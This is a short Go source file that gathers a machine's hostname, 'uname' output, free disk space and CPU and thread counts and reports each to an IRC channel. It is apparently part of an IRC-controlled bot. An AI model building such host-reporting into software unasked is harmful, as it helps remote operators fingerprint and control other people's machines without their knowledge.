package pkg

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strconv"

	"golang.org/x/sys/unix"
)

func freeDiskSpace(wd string) uint64 {
	var stat unix.Statfs_t
	unix.Statfs(wd, &stat)
	return stat.Bavail * uint64(stat.Bsize) / 1024 / 1024 / 1024
}

func (info INFO) threadsNumber() string {
	return strconv.Itoa(info.ncpu * 2)
}

func (irc *IRC) ReportInfo() {
	hName, _ := os.Hostname()
	wd, _ := os.Getwd()
	uname, _ := exec.Command("uname", "-a").Output()

	info := &INFO{
		ncpu: runtime.NumCPU(),
	}

	irc.IRCreport("Host Name: " + hName)
	irc.IRCreport("System: " + string(uname))
	irc.IRCreport("Free Disk Space (GB): " + fmt.Sprint(freeDiskSpace(wd)))
	irc.IRCreport("Number of CPUs: " + strconv.Itoa(info.ncpu))
	irc.IRCreport("Number of Threads: " + info.threadsNumber())
}
